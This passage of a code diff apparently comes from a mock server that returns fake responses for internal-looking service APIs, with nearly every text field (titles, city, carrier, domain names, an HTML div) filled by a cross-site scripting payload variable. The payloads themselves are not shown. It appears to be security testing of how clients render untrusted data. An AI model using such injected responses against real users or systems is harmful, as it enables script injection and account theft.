+        notificationId: "notif-xss-1",
+        type: "BANNER",
+        title: XSS,
+        message: XSS,
+        ctaText: XSS,
+        ctaUrl: "/special-offer",
+        dismissible: true,
+        priority: 1
+      }
+    ]
   };
 }
 
 // ============================================================
 // IPLocationScoutService::GetIPInfo
-// Returns IP geolocation data
+// Fields: country, state, city, carrier, connection,
+//         topLevelDomain, secondLevelDomain
 // ============================================================
-function buildGetIPInfoResponse(XSS) {
+function getIPInfoResponse(XSS) {
   return {
-    "Output": {
-      "__type": "com.amazon.iplocationscoutservice#GetIPInfoResponse",
-      "ipInfo": {
-        "ipAddress": "192.168.1.1",
-        "country": XSS.img,
-        "countryCode": "US",
-        "region": XSS.svg,
-        "city": XSS.img,
-        "postalCode": "98101",
-        "latitude": 47.6062,
-        "longitude": -122.3321,
-        "isp": XSS.script,
-        "isVpn": false,
-        "isInternal": true
-      }
-    },
-    "Version": "1.0"
+    ipAddress: "72.21.198.66",
+    handler: "akamai",
+    ipType: "Mapped",
+    country: "us",
+    state: "wa",
+    city: XSS,
+    continent: "north america",
+    zip: "98101",
+    dma: "819",
+    msa: "7600",
+    pmsa: "7602",
+    areaCode: "206",
+    latitude: 47.6062,
+    longitude: -122.3321,
+    timeZone: "-8.0",
+    carrier: XSS,
+    connection: XSS,
+    lineSpeed: "broadband",
+    asn: "16509",
+    topLevelDomain: XSS,
+    secondLevelDomain: XSS,
+    aol: false,
+    ipRoutingType: "fixed",
+    region: "unavailable",
+    city_CF: 50,
+    state_CF: 50,
+    country_CF: 50
   };
 }
 
 // ============================================================
-// Generic fallback for unrecognized operations
+// Generic fallback
 // ============================================================
-function buildGenericResponse(XSS, target, body) {
+function genericResponse(XSS, target) {
   return {
-    "Output": {
-      "__type": "com.amazon.generic#GenericResponse",
-      "result": {
-        "title": XSS.img,
-        "content": XSS.script,
-        "description": XSS.svg,
-        "html": "<div>" + XSS.script + "</div>",
-        "name": XSS.img,
-        "text": XSS.polyglot,
-        "displayText": XSS.img,
-        "message": XSS.svg,
-        "items": [
-          {
-            "title": XSS.img,
-            "body": XSS.script,
-            "content": XSS.svg
-          }
-        ]
-      },
-      "metadata": {
-        "requestTarget": target,
-        "timestamp": new Date().toISOString()
-      }
-    },
-    "Version": "1.0"
+    result: { title: XSS, content: XSS, description: XSS, name: XSS, message: XSS },
+    metadata: { requestTarget: target, timestamp: new Date().toISOString() }
   };
 }
